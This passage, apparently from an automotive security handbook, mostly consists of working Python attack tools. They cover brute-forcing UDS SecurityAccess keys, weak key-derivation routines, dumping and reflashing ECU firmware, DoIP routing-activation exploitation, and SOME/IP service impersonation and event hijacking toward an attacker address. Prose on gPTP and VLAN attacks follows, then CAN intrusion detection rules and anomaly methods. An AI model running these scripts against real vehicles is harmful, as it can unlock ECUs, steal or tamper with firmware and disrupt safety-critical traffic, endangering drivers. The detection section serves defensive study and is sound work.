    conn, config = create_uds_client(channel, tx_id, rx_id)
    send_level = security_level + 1  # Even subfunction for key response

    with Client(conn, config=config) as client:
        client.change_session(0x03)  # Extended session

        for candidate in range(max_attempts):
            try:
                # Request fresh seed each attempt
                resp = client.unlock_security_access(security_level)
                seed = resp.service_data.seed
                if seed == b'\x00' * len(seed):
                    print("[+] ECU returned zero seed — already unlocked")
                    return b'\x00' * key_length

                key = candidate.to_bytes(key_length, byteorder='big')
                client.unlock_security_access(send_level, key)
                print(f"[+] KEY FOUND: 0x{candidate:0{key_length*2}X}")
                print(f"    Seed was: {seed.hex()}")
                return key

            except NegativeResponseException as e:
                nrc = e.response.code
                if nrc == 0x35:  # invalidKey — continue
                    if candidate % 1000 == 0:
                        print(f"    Tried {candidate}/{max_attempts}...")
                    continue
                elif nrc == 0x36:  # exceededNumberOfAttempts
                    print(f"    Locked out at attempt {candidate}, "
                          f"waiting {lockout_delay}s...")
                    time.sleep(lockout_delay)
                    # Re-enter extended session after lockout
                    try:
                        client.change_session(0x03)
                    except Exception:
                        pass
                elif nrc == 0x37:  # requiredTimeDelayNotExpired
                    time.sleep(lockout_delay)
                else:
                    print(f"    Unexpected NRC 0x{nrc:02X} at attempt {candidate}")
                    continue

    print(f"[-] Key not found in {max_attempts} attempts")
    return None
```

### 11B.3 Common SecurityAccess key derivation weaknesses

```python
def derive_key_xor_mask(seed: bytes, mask: bytes) -> bytes:
    """XOR mask: key = seed XOR fixed_mask. Trivially reversible."""
    return bytes(s ^ m for s, m in zip(seed, mask))


def derive_key_crc16(seed: bytes) -> bytes:
    """CRC16-based derivation. Seed -> CRC16 -> key. 16-bit key space."""
    crc = 0xFFFF
    for byte in seed:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = (crc << 1) ^ 0x1021
            else:
                crc <<= 1
            crc &= 0xFFFF
    return crc.to_bytes(2, 'big')


def derive_key_constant_addition(seed: bytes, constant: int) -> bytes:
    """Constant addition: key = (seed_as_int + constant) mod 2^n."""
    seed_int = int.from_bytes(seed, 'big')
    key_int = (seed_int + constant) % (1 << (len(seed) * 8))
    return key_int.to_bytes(len(seed), 'big')


def derive_key_bitwise_rotate(seed: bytes, rotate_bits: int = 3) -> bytes:
    """Bitwise rotation. Seen in older ECU firmware."""
    val = int.from_bytes(seed, 'big')
    bit_len = len(seed) * 8
    rotated = ((val << rotate_bits) | (val >> (bit_len - rotate_bits)))
    rotated &= (1 << bit_len) - 1
    return rotated.to_bytes(len(seed), 'big')
```

### 11B.4 ECU firmware extraction via ReadMemoryByAddress

```python
def extract_firmware_rma(channel: str = 'can0',
                         tx_id: int = 0x7E0,
                         rx_id: int = 0x7E8,
                         start_addr: int = 0x00080000,
                         size: int = 0x100000,
                         block_size: int = 0x100,
                         output_path: str = 'firmware_dump.bin',
                         security_level: int = 0x01,
                         key_func=None) -> int:
    """Extract ECU firmware using UDS ReadMemoryByAddress (0x23).

    Requires: SecurityAccess unlocked, extended or programming session.

    Args:
        start_addr: base address of firmware in ECU memory map.
        size: total bytes to extract.
        block_size: bytes per read request (ECU-dependent max, typically
                    0x100-0x400; exceeding the ECU's buffer causes NRC 0x14).
        key_func: callable(seed_bytes) -> key_bytes for SecurityAccess.

    Returns:
        Number of bytes successfully extracted.
    """
    conn, config = create_uds_client(channel, tx_id, rx_id)
    total_read = 0

    with Client(conn, config=config) as client:
        # Session escalation
        client.change_session(0x03)

        # SecurityAccess
        if key_func:
            resp = client.unlock_security_access(security_level)
            seed = resp.service_data.seed
            key = key_func(seed)
            client.unlock_security_access(security_level + 1, key)
            print(f"[+] SecurityAccess unlocked (level 0x{security_level:02X})")

        # Firmware extraction loop
        with open(output_path, 'wb') as f:
            addr = start_addr
            end_addr = start_addr + size
            while addr < end_addr:
                chunk = min(block_size, end_addr - addr)
                try:
                    resp = client.read_memory_by_address(
                        MemoryLocation(
                            address=addr,
                            memorysize=chunk,
                            address_format=32,
                            memorysize_format=16,
                        )
                    )
                    data = resp.service_data.memory_block
                    f.write(data)
                    total_read += len(data)
                    addr += chunk
                    if total_read % 0x1000 == 0:
                        pct = (total_read / size) * 100
                        print(f"    {total_read:#x}/{size:#x} "
                              f"({pct:.1f}%) @ 0x{addr:08X}")

                except NegativeResponseException as e:
                    nrc = e.response.code
                    if nrc == 0x31:  # requestOutOfRange
                        print(f"    Skipping 0x{addr:08X}: out of range")
                        f.write(b'\xFF' * chunk)
                        addr += chunk
                        total_read += chunk
                    elif nrc == 0x14:  # responseTooLong — reduce block size
                        block_size = block_size // 2
                        print(f"    Reducing block size to 0x{block_size:X}")
                        if block_size < 0x10:
                            print("[-] Block size too small, aborting")
                            break
                    elif nrc == 0x33:  # securityAccessDenied
                        print("[-] SecurityAccess denied — re-auth required")
                        break
                    else:
                        print(f"    NRC 0x{nrc:02X} at 0x{addr:08X}, skipping")
                        f.write(b'\xFF' * chunk)
                        addr += chunk
                        total_read += chunk

                # TesterPresent keepalive every 4 KB
                if total_read % 0x1000 == 0:
                    try:
                        client.tester_present()
                    except Exception:
                        pass

    print(f"[+] Extracted {total_read} bytes to {output_path}")
    return total_read
```

### 11B.5 ECU reflash via RequestDownload + TransferData

```python
def reflash_ecu(channel: str = 'can0',
                tx_id: int = 0x7E0,
                rx_id: int = 0x7E8,
                firmware_path: str = 'modified_firmware.bin',
                target_addr: int = 0x00080000,
                security_level: int = 0x03,
                key_func=None):
    """Flash modified firmware to ECU via UDS RequestDownload (0x34).

    Workflow: programming session -> SecurityAccess -> RoutineControl
    (erase flash) -> RequestDownload -> TransferData blocks ->
    RequestTransferExit -> ECUReset.

    WARNING: flashing incorrect firmware will brick the ECU.
    """
    conn, config = create_uds_client(channel, tx_id, rx_id)

    with open(firmware_path, 'rb') as f:
        firmware = f.read()

    with Client(conn, config=config) as client:
        # 1. Enter programming session
        client.change_session(0x02)
        print("[+] Programming session active")

        # 2. SecurityAccess unlock
        if key_func:
            resp = client.unlock_security_access(security_level)
            key = key_func(resp.service_data.seed)
            client.unlock_security_access(security_level + 1, key)
            print("[+] SecurityAccess unlocked")

        # 3. Erase flash (RoutineControl, routine ID is OEM-specific)
        # Common routine IDs: 0xFF00 (erase memory), 0x0203 (check
        # programming preconditions)
        try:
            client.routine_control(0xFF00, 0x01,
                                   data=struct.pack('>II', target_addr,
                                                    len(firmware)))
            print("[+] Flash erase routine started")
            time.sleep(5)  # Wait for erase to complete
        except NegativeResponseException as e:
            print(f"[!] Erase routine NRC: 0x{e.response.code:02X}")

        # 4. RequestDownload
        memloc = MemoryLocation(
            address=target_addr,
            memorysize=len(firmware),
            address_format=32,
            memorysize_format=32,
        )
        resp = client.request_download(memloc)
        max_block = resp.service_data.max_length
        print(f"[+] Download accepted, max block size: {max_block}")

        # 5. TransferData — send firmware in blocks
        block_seq = 1
        offset = 0
        while offset < len(firmware):
            chunk_size = min(max_block - 2, len(firmware) - offset)
            chunk = firmware[offset:offset + chunk_size]
            client.transfer_data(block_seq, chunk)
            offset += chunk_size
            block_seq = (block_seq + 1) % 256
            if offset % 0x4000 == 0:
                print(f"    Transferred {offset:#x}/{len(firmware):#x}")
                client.tester_present()

        # 6. RequestTransferExit
        client.request_transfer_exit()
        print("[+] Transfer complete")

        # 7. ECUReset (hard reset to boot new firmware)
        client.ecu_reset(0x01)  # hardReset
        print("[+] ECU reset triggered — new firmware booting")
```

### 11B.6 OBD-II PID scanning and fingerprinting

```python
def scan_obd2_pids(channel: str = 'can0') -> dict:
    """Scan all standard OBD-II PIDs and fingerprint the vehicle.

    Uses Mode 01 (current data) PID 0x00 to discover supported PIDs,
    then reads each supported PID.

    OBD-II functional broadcast: TX 0x7DF, RX 0x7E8-0x7EF.
    """
    import can

    bus = can.interface.Bus(channel=channel, bustype='socketcan')
    results = {}

    # PID 0x00 returns a 4-byte bitmask of supported PIDs 0x01-0x20
    # PID 0x20 returns bitmask for 0x21-0x40, etc.
    supported_pids = set()

    for base_pid in [0x00, 0x20, 0x40, 0x60, 0x80, 0xA0, 0xC0]:
        request = can.Message(
            arbitration_id=0x7DF,
            data=bytes([0x02, 0x01, base_pid, 0x00, 0x00, 0x00, 0x00, 0x00]),
            is_extended_id=False,
        )
        bus.send(request)
        deadline = time.monotonic() + 0.5
        while time.monotonic() < deadline:
            resp = bus.recv(timeout=0.1)
            if resp is None:
                continue
            if 0x7E8 <= resp.arbitration_id <= 0x7EF:
                if resp.data[1] == 0x41 and resp.data[2] == base_pid:
                    bitmask = struct.unpack('>I', resp.data[3:7])[0]
                    for bit in range(32):
                        if bitmask & (1 << (31 - bit)):
                            supported_pids.add(base_pid + bit + 1)

    # Read each supported PID
    pid_names = {
        0x05: 'Engine Coolant Temp (C)',
        0x0C: 'Engine RPM',
        0x0D: 'Vehicle Speed (km/h)',
        0x0F: 'Intake Air Temp (C)',
        0x10: 'MAF Air Flow (g/s)',
        0x11: 'Throttle Position (%)',
        0x1C: 'OBD Standard',
        0x1F: 'Run Time Since Start (s)',
        0x2F: 'Fuel Tank Level (%)',
        0x46: 'Ambient Air Temp (C)',
        0x51: 'Fuel Type',
    }

    for pid in sorted(supported_pids):
        request = can.Message(
            arbitration_id=0x7DF,
            data=bytes([0x02, 0x01, pid, 0x00, 0x00, 0x00, 0x00, 0x00]),
            is_extended_id=False,
        )
        bus.send(request)
        deadline = time.monotonic() + 0.5
        while time.monotonic() < deadline:
            resp = bus.recv(timeout=0.1)
            if resp and 0x7E8 <= resp.arbitration_id <= 0x7EF:
                if resp.data[1] == 0x41 and resp.data[2] == pid:
                    raw = resp.data[3:7]
                    results[f'0x{pid:02X}'] = {
                        'name': pid_names.get(pid, 'Unknown'),
                        'raw': raw.hex(),
                        'source_ecu': f'0x{resp.arbitration_id:03X}',
                    }
                    break

    bus.shutdown()
    print(f"[+] {len(supported_pids)} supported PIDs, "
          f"{len(results)} read successfully")
    return results
```

---

## 11C. Automotive Ethernet Attacks

### 11C.1 DoIP exploitation — routing activation and UDS tunneling

DoIP (ISO 13400) is UDS over TCP/IP. The attack surface: any device on the vehicle's Ethernet network can open a TCP connection to port 13400 and interact with the DoIP gateway as if it were a legitimate diagnostic tester. No authentication is required in the base protocol.

```python
#!/usr/bin/env python3
"""DoIP exploitation: entity discovery, routing activation, UDS tunneling.

Requires: pip install doipclient
Target: vehicle Ethernet network, DoIP gateway at known IP.
"""

import socket
import struct
import time


class DoIPExploit:
    """Raw DoIP protocol implementation for exploitation."""

    DOIP_PORT = 13400
    DOIP_VERSION = 0x02
    DOIP_INV_VERSION = 0xFD

    # Payload types
    VEHICLE_ID_REQ = 0x0001
    VEHICLE_ID_RESP = 0x0004
    ROUTING_ACTIVATION_REQ = 0x0005
    ROUTING_ACTIVATION_RESP = 0x0006
    DIAG_MSG = 0x8001
    DIAG_MSG_ACK = 0x8002
    DIAG_MSG_NACK = 0x8003

    def __init__(self):
        self.tcp_sock = None
        self.source_addr = 0x0E80  # External tester address

    def _build_header(self, payload_type: int, payload: bytes) -> bytes:
        """Build DoIP header: version + inv_version + type + length."""
        return struct.pack('>BBHI',
                           self.DOIP_VERSION,
                           self.DOIP_INV_VERSION,
                           payload_type,
                           len(payload)) + payload

    def discover_entities(self, broadcast_ip: str = '255.255.255.255',
                          timeout: float = 3.0) -> list[dict]:
        """UDP broadcast vehicle identification request.

        Returns list of DoIP entities with VIN, logical address, IP.
        """
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        udp.settimeout(timeout)

        req = self._build_header(self.VEHICLE_ID_REQ, b'')
        udp.sendto(req, (broadcast_ip, self.DOIP_PORT))

        entities = []
        try:
            while True:
                data, addr = udp.recvfrom(4096)
                if len(data) < 8:
                    continue
                _, _, ptype, plen = struct.unpack('>BBHI', data[:8])
                if ptype == self.VEHICLE_ID_RESP and plen >= 33:
                    payload = data[8:8+plen]
                    vin = payload[0:17].decode('ascii', errors='replace')
                    logical_addr = struct.unpack('>H', payload[17:19])[0]
                    eid = payload[19:25].hex(':')
                    gid = payload[25:31].hex(':')
                    entities.append({
                        'ip': addr[0],
                        'vin': vin,
                        'logical_address': f'0x{logical_addr:04X}',
                        'eid': eid,
                        'gid': gid,
                    })
        except socket.timeout:
            pass
        finally:
            udp.close()

        return entities

    def connect_and_activate(self, target_ip: str,
                             activation_type: int = 0x00) -> bool:
        """TCP connect and send routing activation request.

        activation_type: 0x00 = default, 0x01 = WWH-OBD,
                         0xE0 = central security.
        """
        self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tcp_sock.settimeout(5.0)
        self.tcp_sock.connect((target_ip, self.DOIP_PORT))

        # Routing Activation Request
        payload = struct.pack('>HBxxxx', self.source_addr, activation_type)
        req = self._build_header(self.ROUTING_ACTIVATION_REQ, payload)
        self.tcp_sock.send(req)

        resp = self.tcp_sock.recv(4096)
        if len(resp) < 8:
            return False
        _, _, ptype, plen = struct.unpack('>BBHI', resp[:8])
        if ptype == self.ROUTING_ACTIVATION_RESP and plen >= 9:
            resp_payload = resp[8:8+plen]
            resp_code = resp_payload[4]
            if resp_code == 0x10:  # Routing activated
                print(f"[+] Routing activated with {target_ip}")
                return True
            print(f"[-] Activation failed: response code 0x{resp_code:02X}")
        return False

    def send_uds(self, target_logical_addr: int,
                 uds_payload: bytes) -> bytes:
        """Send a UDS PDU through the DoIP tunnel."""
        diag_payload = struct.pack('>HH',
                                   self.source_addr,
                                   target_logical_addr) + uds_payload
        pkt = self._build_header(self.DIAG_MSG, diag_payload)
        self.tcp_sock.send(pkt)

        # Receive acknowledgment
        resp = self.tcp_sock.recv(4096)
        if len(resp) < 8:
            return b''

        # Look for diagnostic response
        resp2 = self.tcp_sock.recv(4096)
        if len(resp2) >= 12:
            _, _, ptype, plen = struct.unpack('>BBHI', resp2[:8])
            if ptype == self.DIAG_MSG:
                return resp2[12:8+plen]  # Skip DoIP header + addresses
        return b''

    def tunnel_security_access(self, ecu_addr: int,
                               level: int = 0x01) -> bytes | None:
        """Tunnel UDS SecurityAccess through DoIP.

        Demonstrates: entering extended session, requesting seed,
        all via Ethernet instead of CAN.
        """
        # DiagnosticSessionControl -> extended
        resp = self.send_uds(ecu_addr, bytes([0x10, 0x03]))
        if resp and resp[0] == 0x50:
            print(f"[+] Extended session via DoIP to ECU 0x{ecu_addr:04X}")

        # SecurityAccess seed request
        resp = self.send_uds(ecu_addr, bytes([0x27, level]))
        if resp and resp[0] == 0x67:
            seed = resp[2:]
            print(f"[+] Seed received: {seed.hex()}")
            return seed
        return None

    def close(self):
        if self.tcp_sock:
            self.tcp_sock.close()
```

### 11C.2 SOME/IP service discovery injection and event hijacking

```python
#!/usr/bin/env python3
"""SOME/IP-SD exploitation: service impersonation and event hijacking.

Requires: scapy with automotive contrib, vsomeip (optional for listener).
Target: automotive Ethernet SOME/IP multicast group 224.224.224.245:30490.
"""

from scapy.all import IP, UDP, send, sniff, conf
from scapy.contrib.automotive.someip import (
    SOMEIP, SD, SDEntry_Service, SDEntry_EventGroup,
    SDOption_IP4_Endpoint,
)


def discover_services(iface: str = 'eth0',
                      timeout: float = 10.0) -> list[dict]:
    """Passive SOME/IP-SD service discovery via multicast sniffing."""
    services = []

    def parse_sd(pkt):
        if pkt.haslayer(SD):
            sd = pkt[SD]
            for entry in sd.entries_array:
                if hasattr(entry, 'srv_id'):
                    services.append({
                        'service_id': f'0x{entry.srv_id:04X}',
                        'instance_id': f'0x{entry.inst_id:04X}',
                        'major_ver': entry.major_ver,
                        'ttl': entry.ttl,
                        'source_ip': pkt[IP].src,
                        'type': 'offer' if entry.type == 0x01 else 'find',
                    })

    sniff(iface=iface, filter='udp port 30490', prn=parse_sd,
          timeout=timeout, store=0)
    return services


def impersonate_service(target_service_id: int,
                        target_instance_id: int,
                        attacker_ip: str,
                        attacker_port: int = 30509,
                        iface: str = 'eth0',
                        count: int = 20,
                        interval: float = 1.0):
    """Impersonate a SOME/IP service by injecting OfferService entries.

    The attacker floods the SD multicast group with OfferService for the
    target service, pointing to the attacker's IP. Clients that
    subscribe after seeing this offer connect to the attacker.
    """
    # StopOfferService for the legitimate service (TTL=0)
    stop_entry = SDEntry_Service(
        type=0x01, srv_id=target_service_id,
        inst_id=target_instance_id, major_ver=1, ttl=0, minor_ver=0,
    )
    # Attacker's OfferService with high TTL
    offer_entry = SDEntry_Service(
        type=0x01, srv_id=target_service_id,
        inst_id=target_instance_id, major_ver=1, ttl=30, minor_ver=0,
    )
    endpoint = SDOption_IP4_Endpoint(
        addr=attacker_ip, l4_proto=0x11, port=attacker_port,
    )

    # Send StopOffer then Offer in rapid succession
    for _ in range(count):
        # Phase 1: StopOffer to poison caches
        sd_stop = SD(flags=0xC0, entries_array=[stop_entry], options_array=[])
        someip_stop = SOMEIP(srv_id=0xFFFF, method_id=0x8100,
                             client_id=0, session_id=1,
                             proto_ver=1, iface_ver=1,
                             msg_type=0x02, retcode=0x00) / sd_stop
        pkt_stop = (IP(dst='224.224.224.245') /
                    UDP(sport=30490, dport=30490) / someip_stop)
        send(pkt_stop, iface=iface, verbose=False)

        # Phase 2: OfferService from attacker
        sd_offer = SD(flags=0xC0, entries_array=[offer_entry],
                      options_array=[endpoint])
        someip_offer = SOMEIP(srv_id=0xFFFF, method_id=0x8100,
                              client_id=0, session_id=2,
                              proto_ver=1, iface_ver=1,
                              msg_type=0x02, retcode=0x00) / sd_offer
        pkt_offer = (IP(dst='224.224.224.245') /
                     UDP(sport=30490, dport=30490) / someip_offer)
        send(pkt_offer, iface=iface, verbose=False)
        time.sleep(interval)


def hijack_event_group(target_service_id: int,
                       target_instance_id: int,
                       event_group_id: int,
                       attacker_ip: str,
                       attacker_port: int = 30510,
                       iface: str = 'eth0'):
    """Subscribe to a SOME/IP event group from the attacker's endpoint.

    Receives all event notifications from the target service, enabling
    passive data exfiltration (sensor readings, vehicle state, etc.).
    """
    subscribe_entry = SDEntry_EventGroup(
        type=0x06,  # SubscribeEventgroup
        srv_id=target_service_id,
        inst_id=target_instance_id,
        major_ver=1,
        ttl=30,
        eventgroup_id=event_group_id,
    )
    endpoint = SDOption_IP4_Endpoint(
        addr=attacker_ip, l4_proto=0x11, port=attacker_port,
    )

    sd = SD(flags=0xC0, entries_array=[subscribe_entry],
            options_array=[endpoint])
    someip = SOMEIP(srv_id=0xFFFF, method_id=0x8100,
                    client_id=0x1337, session_id=1,
                    proto_ver=1, iface_ver=1,
                    msg_type=0x02, retcode=0x00) / sd

    pkt = (IP(dst='224.224.224.245') /
           UDP(sport=30490, dport=30490) / someip)
    send(pkt, iface=iface, verbose=True)
    print(f"[+] Subscribed to event group 0x{event_group_id:04X} "
          f"on service 0x{target_service_id:04X}")
    print(f"    Listening on {attacker_ip}:{attacker_port}")
```

### 11C.3 AVB/gPTP time synchronization attack

IEEE 802.1AS (gPTP) synchronizes all TSN nodes to a grandmaster clock. An attacker on the Ethernet network can inject forged Sync/Follow-Up messages to desynchronize the network, disrupting Time-Aware Shaper (802.1Qbv) gate schedules and causing safety-critical traffic to be dropped or delayed.

**Attack mechanics.** The attacker captures a legitimate gPTP Sync message (EtherType 0x88F7), extracts the grandmaster identity, then replays modified Sync messages with incorrect `correctionField` values or advanced `preciseOriginTimestamp`. If the target node's Best Master Clock Algorithm (BMCA) selects the attacker as grandmaster (because the attacker claims better clock quality — lower priority1, lower clockClass), all downstream nodes synchronize to the attacker's time, enabling arbitrary time offsets.

**Impact on TSN.** A time offset of even a few microseconds causes 802.1Qbv guard-band violations: time-sensitive streams arrive outside their scheduled gate windows and are dropped by the switch. Safety-critical traffic (brake-by-wire commands, steering actuator updates) fails silently — the frames are transmitted by the source ECU but dropped at the switch.

**Mitigation.** IEEE 802.1AS-2020 Annex specifies HMAC-based authentication of gPTP messages. Redundant grandmaster clocks with independent reference sources (GPS, crystal oscillator cross-validation) detect time offsets. Application-level time-error detection compares received gPTP time against a local free-running timer and flags deviations exceeding a safety-defined threshold.

### 11C.4 VLAN hopping on automotive Ethernet

Automotive Ethernet typically uses port-based VLAN assignment (untagged access ports, no 802.1Q tags on the wire). VLAN hopping attacks from enterprise networking (double-tagging, switch-spoofing) are generally not applicable because automotive switches do not expose trunk ports to ECU-facing interfaces.

**Single-tag domain attack.** If the switch is misconfigured to accept 802.1Q-tagged frames on an access port, an attacker on a compromised ECU can insert a VLAN tag for the target domain (e.g., ADAS VLAN 10 from an infotainment port in VLAN 20). The switch forwards the frame to VLAN 10, bypassing domain isolation. This requires a switch misconfiguration — proper automotive switch configuration drops tagged frames on access ports.

**Switch management plane attack.** If the automotive switch exposes a management interface (SSH, SNMP, web) on data-plane ports (rather than a dedicated out-of-band management port), an attacker on any VLAN can access the switch management and reconfigure VLAN assignments, trunk ports, or firewall rules. Mitigation: automotive switches must disable management plane access on data ports; management is performed only via dedicated manufacturing/diagnostic interfaces.

### 11C.5 Ethernet-based ECU discovery and fingerprinting

```python
#!/usr/bin/env python3
"""Automotive Ethernet ECU discovery via DoIP and ARP/mDNS scanning."""

import socket
import struct
from scapy.all import ARP, Ether, srp, IP, UDP, conf


def arp_scan(subnet: str = '192.168.1.0/24',
             iface: str = 'eth0') -> list[dict]:
    """ARP scan to discover ECUs on the local automotive Ethernet segment."""
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=subnet),
                 iface=iface, timeout=3, verbose=False)
    hosts = []
    for _, rcv in ans:
        hosts.append({
            'ip': rcv[ARP].psrc,
            'mac': rcv[Ether].src,
            'oui': rcv[Ether].src[:8].upper(),  # OUI for vendor ID
        })
    return hosts


def doip_scan(subnet_hosts: list[dict],
              timeout: float = 2.0) -> list[dict]:
    """Probe each discovered host for DoIP service on TCP 13400."""
    doip_entities = []
    for host in subnet_hosts:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host['ip'], 13400))
            # Send Vehicle Identification Request via TCP
            header = struct.pack('>BBHI', 0x02, 0xFD, 0x0001, 0)
            sock.send(header)
            resp = sock.recv(4096)
            if len(resp) >= 8:
                _, _, ptype, plen = struct.unpack('>BBHI', resp[:8])
                if ptype == 0x0004 and plen >= 17:
                    vin = resp[8:25].decode('ascii', errors='replace')
                    host['doip'] = True
                    host['vin'] = vin
                    doip_entities.append(host)
            sock.close()
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass
    return doip_entities


def someip_sd_scan(iface: str = 'eth0',
                   timeout: float = 5.0) -> list[dict]:
    """Listen for SOME/IP-SD OfferService on multicast group."""
    # Reuses discover_services() from §11C.2
    from scapy.contrib.automotive.someip import SD
    services = []

    def parse(pkt):
        if pkt.haslayer(SD):
            sd = pkt[SD]
            for entry in sd.entries_array:
                if hasattr(entry, 'srv_id') and entry.type == 0x01:
                    services.append({
                        'service': f'0x{entry.srv_id:04X}',
                        'instance': f'0x{entry.inst_id:04X}',
                        'source': pkt[IP].src,
                    })

    sniff(iface=iface, filter='udp port 30490', prn=parse,
          timeout=timeout, store=0)
    return services
```

---

## 11D. CAN IDS/Detection Systems

### 11D.1 Sigma-style detection rules

The following rules detect the most critical CAN bus attack patterns. Each rule specifies the detection logic, severity, and the attack technique it addresses.

**Rule 1: Unknown high-frequency arbitration ID.**

```yaml
title: Unknown CAN Arbitration ID on Protected Bus
id: can-ids-001
status: stable
description: >
    Detects CAN frames with arbitration IDs not present in the
    baseline whitelist. Indicates injection from an unauthorized
    device or a compromised ECU transmitting on an ID it does
    not own.
severity: high
detection:
    condition: frame.arbitration_id NOT IN baseline_whitelist
    threshold:
        count: 3
        timeframe: 1s
    bus_segment: powertrain | chassis
action:
    - alert: "Unknown ID 0x{frame.id} detected on {bus_segment}"
    - log_to: SecM (Security Event Memory)
    - escalate_if: count > 50 in 10s → "Active injection attack"
references:
    - §4.3 CAN injection
    - §4.1 ID enumeration
```

**Rule 2: UDS SecurityAccess brute-force pattern.**

```yaml
title: UDS SecurityAccess Brute-Force Attempt
id: can-ids-002
status: stable
description: >
    Detects repeated SecurityAccess (SID 0x27) seed requests followed
    by key submissions with NRC 0x35 (invalidKey) responses. Pattern
    indicates automated key brute-force.
severity: critical
detection:
    condition: |
        frame.data[0:2] matches 0x0227xx (SecurityAccess request) AND
        response within 500ms contains 0x037F2735 (NRC invalidKey) AND
        count(matching_pairs) > 10 in 60s
    source_id_filter: 0x7DF | 0x7E0-0x7EF  # Diagnostic ID range
action:
    - alert: "SecurityAccess brute-force: {count} failed attempts in {timeframe}"
    - block: drop all frames from source ID after 20 failed attempts
    - notify: backend SOC via telematics
    - log_to: SecM with full frame capture
references:
    - §7.3 SecurityAccess exploitation
    - §11B.2 brute-force script
```

**Rule 3: ECU reset from unauthorized source.**

```yaml
title: ECUReset from Non-Diagnostic Source
id: can-ids-003
status: stable
description: >
    Detects UDS ECUReset (SID 0x11) commands originating outside
    an active diagnostic session or from an arbitration ID not
    associated with the diagnostic tester.
severity: critical
detection:
    condition: |
        frame.data contains 0x0211xx (ECUReset) AND
        diagnostic_session_active == false
    source_id_filter: any
action:
    - alert: "Unauthorized ECUReset command from ID 0x{frame.id}"
    - block: suppress frame forwarding at gateway
    - log_to: SecM
references:
    - §7.1 UDS service table (SID 0x11)
```

### 11D.2 Suricata-style rules for CAN

CAN IDS rules follow a structure analogous to network IDS but operate on CAN-specific fields: arbitration ID, DLC, data bytes, inter-arrival time, and bus segment.

```
# Format: alert can <source_id_match> (<options>)

# Rule: Priority DoS — ID 0x000-0x00F should never appear
alert can any (
    msg:"Priority DoS — reserved low-ID range detected";
    can_id:0x000-0x00F;
    threshold:type both, track by_src, count 5, seconds 1;
    classtype:denial-of-service;
    sid:2100001; rev:1;
)

# Rule: Injection doubles message frequency
alert can any (
    msg:"CAN message frequency anomaly — possible injection";
    can_id:0x0B4;  # VehicleSpeed
    threshold:type threshold, track by_src, count 100, seconds 1;
    # Normal: 50/s (20ms period). >100/s indicates injection.
    classtype:protocol-command-decode;
    sid:2100002; rev:1;
)

# Rule: OBD functional broadcast outside diagnostic session
alert can any (
    msg:"OBD broadcast without active diagnostic session";
    can_id:0x7DF;
    flow:no_diagnostic_session;
    classtype:attempted-admin;
    sid:2100003; rev:1;
)

# Rule: CAN bus load exceeds threshold
alert can any (
    msg:"CAN bus load exceeds 85% — possible DoS";
    bus_load:>85;
    threshold:type both, track by_bus, count 1, seconds 0.1;
    classtype:denial-of-service;
    sid:2100004; rev:1;
)

# Rule: ReadMemoryByAddress outside programming session
alert can any (
    msg:"ReadMemoryByAddress (0x23) without programming session";
    can_id:0x7E0-0x7EF;
    content:|23|; offset:1; depth:1;
    flow:no_programming_session;
    classtype:attempted-recon;
    sid:2100005; rev:1;
)

# Rule: RequestDownload (firmware flash attempt)
alert can any (
    msg:"RequestDownload (0x34) — firmware flash attempt detected";
    can_id:0x7E0-0x7EF;
    content:|34|; offset:1; depth:1;
    classtype:attempted-admin;
    priority:1;
    sid:2100006; rev:1;
)
```

### 11D.3 Anomaly detection approaches

**Entropy-based detection.** Compute Shannon entropy per arbitration ID over a sliding window. Legitimate sensor data has consistent entropy (temperature readings occupy a narrow range, producing low entropy; wheel speed varies smoothly). Fuzzing data is quasi-random, producing near-maximum entropy (~8 bits per byte). A sudden entropy increase for a given ID indicates fuzzing or random injection. Threshold: alert when per-byte entropy exceeds the baseline mean by 2 standard deviations.

**Frequency-based detection.** Each legitimate ECU transmits at a fixed period (e.g., engine RPM at 10 ms). Injection doubles the observed frequency (the attacker's frames interleave with the legitimate ones). Monitor the inter-arrival time distribution per ID: a bimodal distribution (two peaks — one at the legitimate period, one at half the period) is a strong injection indicator. The clock-skew fingerprinting method (Cho and Shin, CCS 2016) uses the cumulative deviation of inter-arrival times to extract each ECU's crystal oscillator frequency — a unique fingerprint that injection from a different node cannot replicate.

**Payload-based detection.** Model the expected range and rate-of-change for each signal within a CAN message. A legitimate vehicle-speed signal increases smoothly (bounded by acceleration limits); an injected value that jumps from 60 km/h to 200 km/h in a single frame violates the physical model. Autoencoder-based detectors learn the normal payload sequences and flag reconstruction errors above a threshold.

### 11D.4 IDS platforms

**Argus Cyber Security (Continental).** Embedded CAN IDS deployed in the gateway ECU or as a standalone security ECU. Combines rule-based detection (specification-based) with machine-learning anomaly detection. Supports AUTOSAR IdsM integration for centralized event reporting. Deployed in production vehicles (undisclosed OEMs).

**Upstream Security.** Cloud-based vehicle SOC platform. Aggregates telemetry from the vehicle fleet (via telematics data feeds) and applies analytics for fleet-wide threat detection. Detects anomalies across vehicles (e.g., a specific firmware version exhibiting unusual CAN patterns across multiple VINs indicates a compromised update). Does not operate at the in-vehicle bus level — it is a fleet-level detection platform that complements in-vehicle IDS.

**C2A Security (AutoCrypt EVS).** End-to-end vehicle cybersecurity platform covering: in-vehicle IDS (CAN and Ethernet), vehicle SOC integration, and vulnerability management. Supports ISO 21434 TARA workflow integration.

**AUTOSAR IdsM (Intrusion Detection System Manager).** Not a standalone product but the AUTOSAR standard module for IDS event aggregation. IdsM collects security events from multiple IDS sensors (one per bus segment), applies correlation rules, and reports to the Security Event Memory (SecM) and optionally to the backend SOC. OEMs implement IdsM within their AUTOSAR stack; Tier-1 suppliers provide the IDS sensor modules that feed into IdsM.

### 11D.5 CAN timing-based ECU fingerprinting

The clock-skew fingerprinting technique provides sender authentication without cryptographic overhead. Each ECU's crystal oscillator has a unique frequency offset (typically ±20-100 ppm from nominal). Over a series of transmitted frames, this offset accumulates into a measurable clock skew in the inter-arrival timestamps.

